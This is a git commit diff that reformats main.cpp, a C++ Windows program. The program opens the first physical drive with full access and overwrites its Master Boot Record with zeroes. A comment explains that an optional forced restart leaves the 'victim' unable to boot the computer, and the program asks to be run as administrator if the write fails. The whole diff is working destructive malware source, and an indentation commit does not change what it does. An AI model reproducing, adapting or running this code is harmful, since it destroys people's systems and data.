8c66456d60c276d14a34e23bae5f0b0839e58cf4
Spar <74677348+Sparpvp@users.noreply.github.com>
2021-09-04 19:39:20 +0200

    Update main.cpp
    thank you github

--- main.cpp
+++ main.cpp
@@ -17,27 +17,27 @@ int main(){
     ZeroMemory(&mbrData, (sizeof mbrData));
     
     HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
-										 GENERIC_ALL,
-										 FILE_SHARE_READ | FILE_SHARE_WRITE,
-										 NULL,
-										 OPEN_EXISTING,
-										 NULL,
-										 NULL
-										 );
-	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
-		cout << "Master Boot Record was overwritten!";
-		Sleep(1000);
-		CloseHandle(MasterBootRecord);
-		//system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Victim won't be able to start his computer again. Uncomment if you want this result instantly. 
-		ExitProcess(0);
+				 GENERIC_ALL,
+				 FILE_SHARE_READ | FILE_SHARE_WRITE,
+				 NULL,
+				 OPEN_EXISTING,
+				 NULL,
+				 NULL
+				 );
+if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
+	cout << "Master Boot Record was overwritten!";
+	Sleep(1000);
+	CloseHandle(MasterBootRecord);
+	//system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Victim won't be able to start his computer again. Uncomment if you want this result instantly. 
+	ExitProcess(0);
 
-	}
-	else {
-		cout << "Start me as administrator! Failed code execution.";
-		Sleep(5000);
-		CloseHandle(MasterBootRecord);
-		ExitProcess(0);
-	}
+}
+else {
+	cout << "Start me as administrator! Failed code execution.";
+	Sleep(5000);
+	CloseHandle(MasterBootRecord);
+	ExitProcess(0);
+}
 
 return EXIT_SUCCESS;
 
